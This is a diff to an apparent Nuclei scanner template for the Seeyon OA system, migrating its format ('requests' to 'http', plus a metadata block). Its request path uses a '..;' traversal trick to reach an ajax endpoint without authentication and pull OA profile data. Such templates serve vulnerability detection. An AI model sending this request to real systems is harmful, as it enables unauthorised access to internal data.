@@ -7,8 +7,10 @@ info:
   reference:
     - https://buaq.net/go-53721.html
   tags: seeyon,unauth,zhiyuan
+  metadata:
+    max-request: 1
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
